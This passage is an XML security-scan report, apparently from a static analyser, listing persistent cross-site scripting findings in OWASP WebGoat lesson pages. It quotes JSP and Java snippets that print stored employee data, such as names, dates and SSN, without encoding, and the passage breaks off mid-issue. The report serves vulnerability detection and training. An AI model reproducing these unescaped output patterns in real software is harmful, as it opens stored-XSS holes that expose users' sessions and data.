                        <Issue iid="2D59317016151FA8F8F3B635BB10FCD8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="21789BF48DB3DD68200D8E68F78EE5D2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						&lt;!-- STAGE 4 - FIX  Note that the description value below gets encoded and address1 here is not --&gt;

						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4C09B8221DFAE700B48570FBE664CD8A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="25974045A82AD8FE8E1AC701EECFBAFE" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>105</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5E410A233B32AC8C4BC3931C80F3B0ED" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C35C3749E2187C7A6BC13CD0AB9FC19B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B006533175FFC04DA1C8A68E496D8F69" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>240</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);
		return results;
	    }</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FE3497A1A7103E2F0293027F85D4116F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A5E2255DD5599D0F9BAE883C9D7EE845" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6B743CF80DABBF3D5BECF9519E510833" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F23DDCA3D6341DCCC1A3D49DCA8B1C51" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 89 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>89</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;			
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="260A5B19681A901CCBF70F60828EA51F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8B9788D9E96E650BA7FEA9FA82DF8D64" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="81C6BF09430D7517DEFF022D71F3EC88" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ECSFactory.java의 makePulldown() 메서드가 450 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ECSFactory.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ECSFactory.java</FilePath>
<LineStart>450</LineStart>
<Snippet>	Select s = new Select(name);

	s.addElement((String[]) options.toArray(new String[options.size()]));

	return (s);</Snippet>
<TargetFunction>org.apache.ecs.html.Select.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>220</LineStart>
<Snippet>	try
	{
	    ResultSet results = statement3.executeQuery(query);

	    while (results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7E2EC39CF121D76211BB8EFF796AF64B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DACBC7F180A0B21928A7851246DA79F4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C844D296F9EB1772CABE7C22EC2F6600" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C8E591342856F8D8B78DF76F14542835" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2E761A5CC62ED6DAA124E85015EC1654" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D2A3F20E6804E839E9FFCEDD233B8C71" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5D7BD6F96A5C07E61610A7702184E434" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
